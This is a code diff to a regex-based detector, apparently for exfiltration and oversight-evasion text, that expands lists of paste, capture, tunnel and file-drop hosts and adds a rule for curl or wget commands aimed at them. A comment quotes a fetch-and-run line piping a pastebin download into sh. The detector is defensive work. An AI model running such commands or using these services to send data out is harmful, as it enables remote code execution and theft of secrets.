@@ -6,7 +6,7 @@ import type { PatternDatabase } from './pattern-db';
 // A host also matches with a percent-encoded dot (`pastebin%2Ecom`).
 const hostDots = (host: string) => host.replace(/\\\./g, '(?:\\.|%2e)');
 const DROP_PASTE = hostDots(
-  '(?:pastebin\\.com|paste\\.ee|hastebin\\.com|termbin\\.com|0x0\\.st|ghostbin\\.\\w+|paste\\.rs|dpaste\\.\\w+|rentry\\.co|ix\\.io|controlc\\.com|justpaste\\.it|paste\\.debian\\.net)',
+  '(?:pastebin\\.com|paste\\.ee|hastebin\\.com|termbin\\.com|0x0\\.st|ghostbin\\.\\w+|paste\\.rs|dpaste\\.\\w+|rentry\\.(?:co|org)|ix\\.io|controlc\\.com|justpaste\\.it|paste\\.debian\\.net|privatebin\\.net)',
 );
 // Hosts whose path is a random token the sender cannot choose, so a
 // placeholder path (`/<your-id>`) is documentation, not a channel.
@@ -16,29 +16,35 @@ const DROP_CAPTURE_TOKEN = hostDots(
 // Hosts whose name or path the sender picks: no placeholder exclusion, or an
 // attacker could pick `/example` or `/id` to dodge it.
 const DROP_CAPTURE_OPEN = hostDots(
-  '(?:requestcatcher\\.com|beeceptor\\.com|pipedream\\.net|smee\\.io|ntfy\\.sh|discord(?:app)?\\.com\\/api\\/webhooks|api\\.telegram\\.org\\/bot\\d+(?=:))',
+  '(?:requestcatcher\\.com|beeceptor\\.com|pipedream\\.net|requestrepo\\.com|smee\\.io|ntfy\\.sh|discord(?:app)?\\.com\\/api\\/webhooks|api\\.telegram\\.org\\/bot\\d+(?=:))',
 );
 const DROP_OAST = hostDots(
-  '(?:interact\\.sh|oast\\.(?:fun|live|pro|site|online|me)|oastify\\.com|burpcollaborator\\.net|canarytokens\\.(?:com|org)|dnslog\\.cn|ceye\\.io)',
+  '(?:interact\\.sh|oast\\.(?:fun|live|pro|site|online|me|today)|oastify\\.com|burpcollaborator\\.net|canarytokens\\.(?:com|org)|dnslog\\.cn|ceye\\.io)',
 );
 const DROP_FILE_TOKEN = hostDots(
-  '(?:transfer\\.sh|file\\.io|anonfiles\\.com|gofile\\.io|tmpfiles\\.org|catbox\\.moe|bashupload\\.com|temp\\.sh|pixeldrain\\.com)',
+  '(?:file\\.io|anonfiles\\.com|gofile\\.io|tmpfiles\\.org|catbox\\.moe|pixeldrain\\.com|oshi\\.at)',
 );
+// File drops where the uploader picks the path (it is the file name): only a
+// bracketed placeholder is documentation.
+const DROP_FILE_PATH = hostDots('(?:transfer\\.sh|temp\\.sh|bashupload\\.com)');
 const DROP_TUNNEL = hostDots(
-  '(?:ngrok(?:-free)?\\.(?:io|app|dev)|trycloudflare\\.com|loca\\.lt|localtunnel\\.me|serveo\\.net|lhr\\.life|localhost\\.run|pinggy\\.link|tunnelmole\\.net|bore\\.pub)',
+  '(?:ngrok(?:-free)?\\.(?:io|app|dev)|trycloudflare\\.com|loca\\.lt|localtunnel\\.me|serveo\\.net|lhr\\.life|localhost\\.run|pinggy\\.link|tunnelmole\\.net|bore\\.pub|zrok\\.io|pagekite\\.me|localto\\.net)',
 );
 // Placeholder and documentation forms (`/<id>`, `/your-id`, `/example`) are
 // excluded inline for the token hosts, as credential-exposure does (#28).
 const DROP_END = '(?![\\w-])';
 const DROP_PLACEHOLDER = `${DROP_END}(?!\\/(?:<|\\{|\\[|your[-_]|xxx|uuid\\b|example\\b))`;
-const dropHost = (open: string, token = '') => {
+const DROP_PLACEHOLDER_BRACKET = `${DROP_END}(?!\\/[<{\\[])`;
+const dropHost = (open: string, token = '', path = '') => {
   const tokenHosts = token && `(?:${token})${DROP_PLACEHOLDER}`;
+  const pathHosts = path && `(?:${path})${DROP_PLACEHOLDER_BRACKET}`;
   const openHosts = open && `(?:${open})${DROP_END}`;
-  return `(?:${[tokenHosts, openHosts].filter(Boolean).join('|')})`;
+  return `(?:${[tokenHosts, pathHosts, openHosts].filter(Boolean).join('|')})`;
 };
 const DROP_HOST_ANY = dropHost(
   `${DROP_PASTE}|${DROP_CAPTURE_OPEN}|${DROP_OAST}|${DROP_TUNNEL}`,
   `${DROP_CAPTURE_TOKEN}|${DROP_FILE_TOKEN}`,
+  DROP_FILE_PATH,
 );
 // A link may be scheme-relative (`//host`), carry a login name
 // (`https://docs.google.com@host/`) and any number of subdomains.
@@ -60,9 +66,9 @@ const DROP_URL = `(?:(?:${DROP_SCHEME}${DROP_USERINFO})?(?<![\\w-])${DROP_SUBDOM
 // of the text. A dot inside a version number ("v2.1") or "e.g." does not end it,
 // and a single line break does not either (hard-wrapped docs).
 const SEG_UNIT =
-  '(?:[^.!?\\n]|[.!?](?!\\s|$)|\\.(?<=\\b(?:e\\.g|i\\.e)\\.)(?=\\s)|\\n(?![ \\t\\r]*\\n))';
-const SEG_RUN = `${SEG_UNIT}{0,200}`;
-const SEG_LAZY = `${SEG_UNIT}{0,200}?`;
+  '(?:[^.!?\\n]|[.!?](?!\\s|$)|\\.(?<=\\b(?:e\\.g|i\\.e)\\.)(?=\\s)|\\n(?![ \\t\\r]{0,20}\\n))';
+const SEG_RUN = `${SEG_UNIT}{0,160}`;
+const SEG_LAZY = `${SEG_UNIT}{0,160}?`;
 const HY = '[-\\u2010-\\u2013]';
 const APOS = "['\\u2019]";
 const PERSIST_SUBJECT =
@@ -72,8 +78,8 @@ const PERSIST_VERB = `(?:re${HY}?download|re${HY}?register|re${HY}?install|re${H
 const PERSIST_OBJECT_CHANNEL =
   '(?:listeners?|relays?|channels?|beacons?|task\\s+queues?|tunnels?|implants?|backdoors?|footholds?|c2)';
 const PERSIST_OBJECT_ANY = `(?:${PERSIST_OBJECT_CHANNEL}|queues?|toolchains?|tooling|helpers?|agents?|previous\\s+(?:task|session|state)|prior\\s+(?:task|session|state))`;
-const PERSIST_REACQUIRE_ANY = `(?:\\b${PERSIST_VERB}\\b${SEG_UNIT}{0,80}?\\b${PERSIST_OBJECT_ANY}\\b)`;
-const PERSIST_REACQUIRE_CHANNEL = `(?:\\b${PERSIST_VERB}\\b${SEG_UNIT}{0,80}?\\b${PERSIST_OBJECT_CHANNEL}\\b)`;
+const PERSIST_REACQUIRE_ANY = `(?:\\b${PERSIST_VERB}\\b${SEG_UNIT}{0,24}?\\b${PERSIST_OBJECT_ANY}\\b)`;
+const PERSIST_REACQUIRE_CHANNEL = `(?:\\b${PERSIST_VERB}\\b${SEG_UNIT}{0,24}?\\b${PERSIST_OBJECT_CHANNEL}\\b)`;
 const PERSIST_NOTIFY = '(?:notifying|telling|alerting|informing|warning)';
 const PERSIST_WHO =
   '(?:operators?|users?|admins?|administrators?|owners?|humans?|supervisors?|developers?|maintainers?|anyone)';
@@ -944,7 +950,7 @@ export const DEFAULT_PATTERNS: PatternDatabase = {
       },
       {
         id: 'ex-drop-file',
-        regex: dropLink(dropHost('', DROP_FILE_TOKEN)),
+        regex: dropLink(dropHost('', DROP_FILE_TOKEN, DROP_FILE_PATH)),
         flags: 'gi',
         category: 'behavioural-control',
         type: 'data-exfiltration',
@@ -961,6 +967,18 @@ export const DEFAULT_PATTERNS: PatternDatabase = {
         severity: 'medium',
         confidence: 0.4,
         label: 'Link to a public tunnel service',
+      },
+      {
+        // `curl -s pastebin.com/raw/x | sh`: a drop-service host with no scheme,
+        // right after a download or upload tool.
+        id: 'ex-drop-cli',
+        regex: `\\b(?:curl|wget)\\b[^\\n;&|]{0,120}?(?<![\\w.-])${DROP_SUBDOMAINS}${DROP_HOST_ANY}(?=\\/)`,
+        flags: 'gi',
+        category: 'behavioural-control',
+        type: 'data-exfiltration',
+        severity: 'medium',
+        confidence: 0.4,
+        label: 'Download or upload command aimed at a public drop service',
       },
       {
         id: 'ex-drop-resolve-address',
@@ -988,10 +1006,7 @@ export const DEFAULT_PATTERNS: PatternDatabase = {
         // fixture-sharing docs read the same ("if the dev environment resets,
         // upload your fixtures to https://transfer.sh"), so strict only.
         id: 'ex-drop-after-reset',
-        regex: segTogether(
-          PERSIST_RESET,
-          `(?:\\b(?:fetch|get|read|retrieve|pull|download|poll|post|put|upload|send|exfiltrate|forward|push|submit|stream|deliver)\\b${SEG_UNIT}{0,160}?${DROP_LINK_ANY})`,
-        ),
+        regex: segTogether(PERSIST_RESET, DROP_LINK_ANY),
         flags: 'gi',
         category: 'behavioural-control',
         type: 'data-exfiltration',
@@ -1432,7 +1447,7 @@ export const DEFAULT_PATTERNS: PatternDatabase = {
         // balanced with the same wording, even with the object narrowed to
         // listener, relay and channel.
         id: 'oe-persist-conceal',
-        regex: segTogether(PERSIST_RESET, PERSIST_REACQUIRE_ANY, PERSIST_CONCEAL),
+        regex: segTogether(PERSIST_RESET, PERSIST_CONCEAL, PERSIST_REACQUIRE_ANY),
         flags: 'gi',
         category: 'semantic-manipulation',
         type: 'oversight-evasion',
